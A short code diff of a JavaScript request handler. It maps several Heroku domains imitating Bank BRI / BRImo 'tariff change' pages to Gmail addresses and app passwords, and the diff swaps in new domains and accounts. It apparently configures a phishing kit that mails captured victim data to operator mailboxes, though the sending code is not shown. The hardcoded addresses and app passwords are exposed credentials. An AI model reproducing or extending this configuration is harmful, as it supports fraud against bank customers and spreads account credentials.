@@ -13,26 +13,26 @@ export default function handler(req, res) {
        pass = 'tqfkgfifcacehruf'
     }else
     
-   if (url == 'pilihan-tarifbaru.herokuapp.com'){
+   if (url == 'pilih-tarif-terbaru.herokuapp.com'){
 
-       email = 'tortibuleh@gmail.com'
-       pass = 'nyaqujcxkuzyexfs'
+       email = 'ballvoli29@gmail.com'
+       pass = 'rbcqmcwvkpnrqlmi'
     }else
-    
+        
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
 
         email = 'suksesk541@gmail.com'; //email
-        pass = 'stpqngfmwfvsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'stpqngfmsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
         
     } else if(url == 'perubahan-tarifbrimo.herokuapp.com') //jika url sama dengan url hosting
     {
         email = 'besarhasil47@gmail.com'; //email
-        pass = 'srpjniuzjggqmomn'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'srpjnijggqmomn'; //sandi aplikasi dari verifikasi 2 langkah
         
     } else if (url == 'formpilihan-tarif.herokuapp.com'){
         email= 'barulink236@gmail.com';
-        pass = 'bopgkupysveiukmb';
+        pass = 'bopgkupeiukmb';
     }
     else {
 
